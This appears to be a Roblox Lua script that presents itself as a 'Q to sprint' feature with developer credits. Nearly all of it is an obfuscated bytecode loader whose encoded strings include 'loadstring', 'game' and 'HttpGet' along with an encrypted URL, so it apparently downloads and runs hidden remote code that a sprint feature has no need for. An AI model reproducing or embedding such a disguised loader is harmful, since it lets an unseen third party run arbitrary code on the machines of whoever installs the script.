
-- Q to sprint fatties


local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v24,v25) local v26={};for v41=1, #v24 do v6(v26,v0(v4(v1(v2(v24,v41,v41 + 1 )),v1(v2(v25,1 + (v41% #v25) ,1 + (v41% #v25) + 1 )))%256 ));end return v5(v26);end local v8=tonumber;local v9=string.byte;local v10=string.char;local v11=string.sub;local v12=string.gsub;local v13=string.rep;local v14=table.concat;local v15=table.insert;local v16=math.ldexp;local v17=getfenv or function() return _ENV;end ;local v18=setmetatable;local v19=pcall;local v20=select;local v21=unpack or table.unpack ;local v22=tonumber;local function v23(v27,v28,...) local v29=1;local v30;v27=v12(v11(v27,5),v7("\153\95","\78\183\113\226\77\197\42\188"),function(v42) if (v9(v42,2)==79) then v30=v8(v11(v42,1,2 -1 ));return "";else local v93=0;local v94;while true do if (v93==0) then v94=v10(v8(v42,16));if v30 then local v118=0;local v119;while true do if (v118==1) then return v119;end if (v118==0) then v119=v13(v94,v30);v30=nil;v118=1;end end else return v94;end break;end end end end);local function v31(v43,v44,v45) if v45 then local v95=(v43/((5 -3)^(v44-1)))%(2^(((v45-1) -(v44-1)) + 1)) ;return v95-(v95%1) ;else local v96=2^(v44-1) ;return (((v43%(v96 + v96))>=v96) and 1) or (0 -0) ;end end local function v32() local v46=v9(v27,v29,v29);v29=v29 + (2 -1) ;return v46;end local function v33() local v47,v48=v9(v27,v29,v29 + 2 );v29=v29 + 2 ;return (v48 * 256) + v47 ;end local function v34() local v49=0;local v50;local v51;local v52;local v53;while true do if (v49==0) then v50,v51,v52,v53=v9(v27,v29,v29 + 3 );v29=v29 + 4 ;v49=1;end if (v49==1) then return (v53 * 16777216) + (v52 * 65536) + (v51 * 256) + v50 ;end end end local function v35() local v54=0;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (1==v54) then v57=1;v58=(v31(v56,1,20) * (2^32)) + v55 ;v54=2;end if (v54==0) then v55=v34();v56=v34();v54=1;end if (v54==3) then if (v59==0) then if (v58==0) then return v60 * 0 ;else local v120=0;while true do if (v120==0) then v59=1;v57=0;break;end end end elseif (v59==2047) then return ((v58==0) and (v60 * (1/0))) or (v60 * NaN) ;end return v16(v60,v59-1023 ) * (v57 + (v58/(2^52))) ;end if (v54==2) then v59=v31(v56,640 -(555 + 64) ,31);v60=((v31(v56,32)==1) and  -1) or 1 ;v54=3;end end end local function v36(v61) local v62;if  not v61 then v61=v34();if (v61==0) then return "";end end v62=v11(v27,v29,(v29 + v61) -1 );v29=v29 + v61 ;local v63={};for v77=1, #v62 do v63[v77]=v10(v9(v11(v62,v77,v77)));end return v14(v63);end local v37=v34;local function v38(...) return {...},v20("#",...);end local function v39() local v64=0;local v65;local v66;local v67;local v68;local v69;local v70;while true do if (v64==1) then v69=v34();v70={};for v100=1,v69 do local v101=0;local v102;local v103;while true do if (v101==0) then v102=v32();v103=nil;v101=1;end if (v101==1) then if (v102==1) then v103=v32()~=(927 -(214 + 713)) ;elseif (v102==2) then v103=v35();elseif (v102==3) then v103=v36();end v70[v100]=v103;break;end end end v68[3]=v32();v64=2;end if (0==v64) then v65={};v66={};v67={};v68={v65,v66,nil,v67};v64=1;end if (2==v64) then for v104=1,v34() do local v105=v32();if (v31(v105,1,1)==0) then local v114=v31(v105,2,3);local v115=v31(v105,4,6);local v116={v33(),v33(),nil,nil};if (v114==0) then local v122=0;while true do if (v122==0) then v116[3]=v33();v116[4]=v33();break;end end elseif (v114==1) then v116[3]=v34();elseif (v114==2) then v116[3]=v34() -(2^16) ;elseif (v114==3) then v116[3]=v34() -(2^16) ;v116[4]=v33();end if (v31(v115,1,1)==1) then v116[2]=v70[v116[2]];end if (v31(v115,2,2)==1) then v116[3]=v70[v116[1 + 2 ]];end if (v31(v115,880 -(282 + 595) ,3)==1) then v116[1641 -(1523 + 114) ]=v70[v116[4]];end v65[v104]=v116;end end for v106=1,v34() do v66[v106-1 ]=v39();end return v68;end end end local function v40(v71,v72,v73) local v74=v71[1];local v75=v71[2];local v76=v71[3 + 0 ];return function(...) local v79=v74;local v80=v75;local v81=v76;local v82=v38;local v83=1;local v84= -1;local v85={};local v86={...};local v87=v20("#",...) -1 ;local v88={};local v89={};for v97=0,v87 do if (v97>=v81) then v85[v97-v81 ]=v86[v97 + 1 ];else v89[v97]=v86[v97 + 1 ];end end local v90=(v87-v81) + 1 ;local v91;local v92;while true do local v98=0;while true do if (v98==0) then v91=v79[v83];v92=v91[1];v98=1;end if (v98==1) then if (v92<=31) then if (v92<=15) then if (v92<=7) then if (v92<=3) then if (v92<=(1 -0)) then if (v92==0) then local v135=0;local v136;local v137;local v138;while true do if (v135==2) then for v298=1,v91[4] do local v299=0;local v300;while true do if (v299==1) then if (v300[1]==8) then v138[v298-1 ]={v89,v300[3]};else v138[v298-1 ]={v72,v300[3]};end v88[ #v88 + 1 ]=v138;break;end if (v299==0) then v83=v83 + 1 ;v300=v79[v83];v299=1;end end end v89[v91[2]]=v40(v136,v137,v73);break;end if (v135==1) then v138={};v137=v18({},{[v7("\138\5\31\87\177\63\14","\57\213\90\118")]=function(v301,v302) local v303=0;local v304;while true do if (v303==0) then v304=v138[v302];return v304[1][v304[2]];end end end,[v7("\114\100\32\177\65\9\67\95\43\172","\96\45\59\78\212\54")]=function(v305,v306,v307) local v308=0;local v309;while true do if (v308==0) then v309=v138[v306];v309[1][v309[2]]=v307;break;end end end});v135=2;end if (v135==0) then v136=v80[v91[3]];v137=nil;v135=1;end end else v89[v91[2]]=v89[v91[3]] + v91[4] ;end elseif (v92>2) then v89[v91[2]]=v73[v91[3]];else local v142=0;local v143;local v144;local v145;local v146;while true do if (v142==0) then v143=v91[2];v144,v145=v82(v89[v143](v21(v89,v143 + 1 ,v84)));v142=1;end if (v142==1) then v84=(v145 + v143) -1 ;v146=0;v142=2;end if (v142==2) then for v310=v143,v84 do local v311=0;while true do if (v311==0) then v146=v146 + (1066 -(68 + 997)) ;v89[v310]=v144[v146];break;end end end break;end end end elseif (v92<=5) then if (v92==4) then if  not v89[v91[2]] then v83=v83 + 1 ;else v83=v91[3];end else local v147=v91[2];local v148,v149=v82(v89[v147](v21(v89,v147 + 1 ,v91[3])));v84=(v149 + v147) -1 ;local v150=1270 -(226 + 1044) ;for v249=v147,v84 do local v250=0;while true do if (0==v250) then v150=v150 + 1 ;v89[v249]=v148[v150];break;end end end end elseif (v92>6) then v89[v91[2]]=v89[v91[3]]%v89[v91[4]] ;else v89[v91[8 -6 ]]=v89[v91[3]]%v91[121 -(32 + 85) ] ;end elseif (v92<=11) then if (v92<=9) then if (v92==8) then v89[v91[2]]=v89[v91[3]];else for v251=v91[2],v91[3] do v89[v251]=nil;end end elseif (v92>10) then local v155=0;local v156;while true do if (v155==0) then v156=v91[2 + 0 ];v89[v156]=v89[v156](v21(v89,v156 + 1 ,v84));break;end end else v89[v91[2]]=v72[v91[3]];end elseif (v92<=13) then if (v92==12) then v89[v91[2]]= #v89[v91[3]];else local v160=0;local v161;local v162;while true do if (v160==0) then v161=v91[2];v162=v89[v161];v160=1;end if (1==v160) then for v314=v161 + 1 ,v84 do v15(v162,v89[v314]);end break;end end end elseif (v92>(4 + 10)) then local v163=0;local v164;local v165;local v166;while true do if (v163==0) then v164=v80[v91[3]];v165=nil;v163=1;end if (v163==2) then for v315=1,v91[9 -5 ] do local v316=0;local v317;while true do if (v316==0) then v83=v83 + 1 ;v317=v79[v83];v316=1;end if (1==v316) then if (v317[1]==8) then v166[v315-1 ]={v89,v317[3]};else v166[v315-1 ]={v72,v317[3]};end v88[ #v88 + 1 ]=v166;break;end end end v89[v91[2]]=v40(v164,v165,v73);break;end if (v163==1) then v166={};v165=v18({},{[v7("\47\105\138\133\130\43\181","\144\112\54\227\235\230\78\205")]=function(v318,v319) local v320=v166[v319];return v320[1][v320[2]];end,[v7("\140\23\1\249\199\82\189\44\10\228","\59\211\72\111\156\176")]=function(v321,v322,v323) local v324=v166[v322];v324[1][v324[959 -(892 + 65) ]]=v323;end});v163=2;end end else do return;end end elseif (v92<=23) then if (v92<=19) then if (v92<=17) then if (v92>16) then if (v89[v91[2]]==v91[4]) then v83=v83 + 1 ;else v83=v91[3];end else local v167=v91[2];local v168=v89[v167];for v253=v167 + 1 ,v84 do v15(v168,v89[v253]);end end elseif (v92>18) then local v169=v91[3 -1 ];local v170=v89[v169];local v171=v89[v169 + 2 ];if (v171>0) then if (v170>v89[v169 + 1 ]) then v83=v91[3];else v89[v169 + (353 -(87 + 263)) ]=v170;end elseif (v170<v89[v169 + 1 ]) then v83=v91[3];else v89[v169 + 3 ]=v170;end else do return v89[v91[2]]();end end elseif (v92<=21) then if (v92>20) then if  not v89[v91[2]] then v83=v83 + 1 ;else v83=v91[3];end else v83=v91[183 -(67 + 113) ];end elseif (v92>22) then local v173=0;local v174;local v175;while true do if (v173==0) then v174=v91[2];v175=v89[v91[3]];v173=1;end if (v173==1) then v89[v174 + 1 ]=v175;v89[v174]=v175[v91[4]];break;end end else local v176=0;local v177;local v178;local v179;local v180;while true do if (v176==2) then for v330=v177,v84 do v180=v180 + 1 ;v89[v330]=v178[v180];end break;end if (0==v176) then v177=v91[2];v178,v179=v82(v89[v177](v21(v89,v177 + 1 ,v84)));v176=1;end if (1==v176) then v84=(v179 + v177) -1 ;v180=0;v176=2;end end end elseif (v92<=27) then if (v92<=25) then if (v92>24) then v89[v91[2]]={};else local v182=0;local v183;while true do if (v182==0) then v183=v91[2];v89[v183](v21(v89,v183 + 1 ,v84));break;end end end elseif (v92==(20 + 6)) then local v184=0;local v185;local v186;local v187;while true do if (v184==2) then if (v186>0) then if (v187<=v89[v185 + (2 -1) ]) then local v354=0;while true do if (v354==0) then v83=v91[3 + 0 ];v89[v185 + (11 -8) ]=v187;break;end end end elseif (v187>=v89[v185 + 1 ]) then local v355=0;while true do if (v355==0) then v83=v91[3];v89[v185 + 3 ]=v187;break;end end end break;end if (v184==0) then v185=v91[2];v186=v89[v185 + 2 ];v184=1;end if (v184==1) then v187=v89[v185] + v186 ;v89[v185]=v187;v184=2;end end else local v188=v91[2];v89[v188]=v89[v188](v21(v89,v188 + 1 ,v91[3]));end elseif (v92<=29) then if (v92==28) then for v254=v91[2],v91[955 -(802 + 150) ] do v89[v254]=nil;end else local v190=0;local v191;local v192;local v193;local v194;while true do if (v190==1) then v84=(v193 + v191) -(2 -1) ;v194=0 -0 ;v190=2;end if (v190==2) then for v333=v191,v84 do local v334=0;while true do if (v334==0) then v194=v194 + 1 ;v89[v333]=v192[v194];break;end end end break;end if (0==v190) then v191=v91[2];v192,v193=v82(v89[v191](v21(v89,v191 + 1 ,v91[3])));v190=1;end end end elseif (v92>30) then if v89[v91[2]] then v83=v83 + 1 ;else v83=v91[3 + 0 ];end else v89[v91[2]]=v91[3];end elseif (v92<=47) then if (v92<=39) then if (v92<=35) then if (v92<=33) then if (v92>32) then local v197=v91[999 -(915 + 82) ];local v198,v199=v82(v89[v197](v89[v197 + 1 ]));v84=(v199 + v197) -1 ;local v200=0;for v256=v197,v84 do local v257=0;while true do if (v257==0) then v200=v200 + 1 ;v89[v256]=v198[v200];break;end end end elseif (v89[v91[2]]==v91[4]) then v83=v83 + 1 ;else v83=v91[3];end elseif (v92>34) then local v201=0;local v202;while true do if (v201==0) then v202=v91[2];v89[v202]=v89[v202](v21(v89,v202 + 1 ,v84));break;end end else v89[v91[2]]=v72[v91[3]];end elseif (v92<=37) then if (v92>36) then v89[v91[2]]();else v83=v91[8 -5 ];end elseif (v92==38) then v89[v91[2 + 0 ]]=v89[v91[3 -0 ]]%v89[v91[4]] ;else local v207=0;local v208;while true do if (v207==0) then v208=v91[1189 -(1069 + 118) ];do return v89[v208](v21(v89,v208 + 1 ,v91[3]));end break;end end end elseif (v92<=43) then if (v92<=41) then if (v92>40) then v89[v91[2]]= #v89[v91[3]];else local v210=0;local v211;while true do if (v210==0) then v211=v91[2];do return v89[v211](v21(v89,v211 + 1 ,v91[3]));end break;end end end elseif (v92>42) then local v212=v91[2];v89[v212]=v89[v212](v21(v89,v212 + (2 -1) ,v91[3]));else local v214=v91[2];local v215,v216=v82(v89[v214](v89[v214 + 1 ]));v84=(v216 + v214) -1 ;local v217=0;for v258=v214,v84 do local v259=0;while true do if (v259==0) then v217=v217 + 1 ;v89[v258]=v215[v217];break;end end end end elseif (v92<=45) then if (v92==44) then if v89[v91[2]] then v83=v83 + 1 ;else v83=v91[6 -3 ];end else local v218=0;local v219;local v220;while true do if (v218==1) then v89[v219 + 1 ]=v220;v89[v219]=v220[v91[6 -2 ]];break;end if (v218==0) then v219=v91[1 + 1 ];v220=v89[v91[3]];v218=1;end end end elseif (v92>(46 + 0)) then v89[v91[793 -(368 + 423) ]]=v89[v91[9 -6 ]]%v91[4] ;else local v222=v91[20 -(10 + 8) ];local v223=v89[v222];local v224=v89[v222 + 2 ];if (v224>0) then if (v223>v89[v222 + 1 ]) then v83=v91[3];else v89[v222 + 3 ]=v223;end elseif (v223<v89[v222 + 1 ]) then v83=v91[11 -8 ];else v89[v222 + 3 ]=v223;end end elseif (v92<=(497 -(416 + 26))) then if (v92<=51) then if (v92<=49) then if (v92>48) then v89[v91[2]]=v89[v91[3]][v91[4]];else local v227=v91[6 -4 ];local v228=v89[v227 + 2 ];local v229=v89[v227] + v228 ;v89[v227]=v229;if (v228>0) then if (v229<=v89[v227 + 1 ]) then local v343=0;while true do if (v343==0) then v83=v91[3];v89[v227 + 3 ]=v229;break;end end end elseif (v229>=v89[v227 + 1 ]) then local v344=0;while true do if (v344==0) then v83=v91[3];v89[v227 + 3 ]=v229;break;end end end end elseif (v92>50) then local v231=0;local v232;while true do if (0==v231) then v232=v91[2];v89[v232](v21(v89,v232 + 1 ,v84));break;end end else do return v89[v91[2]]();end end elseif (v92<=53) then if (v92>(23 + 29)) then local v233=0;local v234;while true do if (v233==0) then v234=v91[2];do return v21(v89,v234,v84);end break;end end else v89[v91[2]]=v89[v91[3]];end elseif (v92>54) then local v237=0;local v238;while true do if (v237==0) then v238=v91[2];do return v21(v89,v238,v84);end break;end end else do return;end end elseif (v92<=(103 -44)) then if (v92<=57) then if (v92>56) then v89[v91[2]]=v91[441 -(145 + 293) ];else v89[v91[2]]={};end elseif (v92==58) then v89[v91[2]]=v89[v91[3]][v91[4]];else v89[v91[2]]=v89[v91[3]] + v91[4] ;end elseif (v92<=(491 -(44 + 386))) then if (v92>60) then v89[v91[2]]=v73[v91[3]];else v89[v91[2]]();end elseif (v92==62) then v89[v91[2]]=v91[3] + v89[v91[4]] ;else v89[v91[2]]=v91[3] + v89[v91[4]] ;end v83=v83 + 1 ;break;end end end end;end return v40(v39(),{},v28)(...);end return v23("LOL!0D3O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403053O006D6174636803083O00746F6E756D62657203053O007063612O6C00243O0012033O00013O00203A5O0002001203000100013O00203A000100010003001203000200013O00203A000200020004001203000300053O0006040003000A000100010004143O000A0001001203000300063O00203A000400030007001203000500083O00203A000500050009001203000600083O00203A00060006000A00062O00073O000100062O00083O00064O00088O00083O00044O00083O00014O00083O00024O00083O00053O001203000800013O00203A00080008000B0012030009000C3O001203000A000D3O00062O000B0001000100052O00083O00074O00083O00094O00083O00084O00083O000A4O00083O000B4O0034000C000B4O0032000C00014O0035000C6O00363O00013O00023O00023O00026O00F03F026O00704002264O003800025O00121E000300014O002900045O00121E000500013O00042E0003002100012O000A00076O0034000800024O000A000900014O000A000A00024O000A000B00034O000A000C00044O0034000D6O0034000E00063O002001000F000600012O0005000C000F4O0023000B3O00022O000A000C00034O000A000D00044O0034000E00014O0029000F00014O0026000F0006000F00103E000F0001000F2O0029001000014O002600100006001000103E0010000100100020010010001000012O0005000D00104O0002000C6O0023000A3O0002002006000A000A00022O00210009000A4O001800073O000100041A0003000500012O000A000300054O0034000400024O0028000300044O003500036O00363O00017O00043O00027O004003053O003A25642B3A2O033O0025642B026O00F03F001C3O00066O000100012O00228O000A000100014O000A000200024O000A000300024O003800046O000A000500034O003400066O0009000700074O0005000500074O001000043O000100203A00040004000100121E000500024O002B00030005000200121E000400034O0005000200044O002300013O000200262000010018000100040004143O001800012O003400016O003800026O0028000100024O003500015O0004143O001B00012O000A000100044O0032000100014O003500016O00363O00013O00013O00063O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403203O00D9D7CF35F5E18851C1C2C831E3BDDE50D0D3CB6AEAA1FD2CD7CDEE712OA9C60903083O007EB1A3BB4586DBA7026O00F03F010F3O00062C3O000D00013O0004143O000D0001001203000100013O001203000200023O00202D0002000200032O000A00045O00121E000500043O00121E000600054O0005000400064O000200026O002300013O00022O003C0001000100010004143O000E000100203A00013O00062O00363O00017O00",v17(),...);


-- credits
-- Main Coder: Noonie Loafer
-- Modeling, Art Direction and sound design: Ping (i also did some coding shut up)
-- Misc Devs (also very cool people): RealCat, Muhammad and Crow With a Gun 
